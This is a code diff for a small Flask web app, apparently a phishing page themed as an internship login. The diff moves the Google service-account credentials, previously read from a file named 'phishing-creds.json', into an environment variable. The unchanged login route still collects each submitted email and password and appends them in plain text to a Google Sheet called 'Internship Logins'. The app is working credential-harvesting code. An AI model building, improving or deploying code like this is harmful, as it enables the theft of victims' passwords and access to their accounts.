@@ -1,15 +1,24 @@
 from flask import Flask, render_template, request, redirect
 import os
+import json
+from datetime import datetime
 import gspread
 from oauth2client.service_account import ServiceAccountCredentials
-from datetime import datetime
 
 app = Flask(__name__)
 
-# Google Sheets setup
+# Setup Google Sheets API using credentials from Railway secret
 scope = ["https://spreadsheets.google.com/feeds", "https://www.googleapis.com/auth/drive"]
-creds = ServiceAccountCredentials.from_json_keyfile_name("phishing-creds.json", scope)
+creds_json = os.environ.get("GOOGLE_CREDS_JSON")
+
+if not creds_json:
+    raise Exception("GOOGLE_CREDS_JSON environment variable is missing!")
+
+creds_dict = json.loads(creds_json)
+creds = ServiceAccountCredentials.from_json_keyfile_dict(creds_dict, scope)
 client = gspread.authorize(creds)
+
+# Open the first sheet
 sheet = client.open("Internship Logins").sheet1
 
 @app.route('/')
@@ -22,7 +31,7 @@ def login():
     password = request.form['password']
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    # Log to Google Sheet
+    # Append credentials to the sheet
     sheet.append_row([email, password, timestamp])
 
     return redirect('/dashboard')
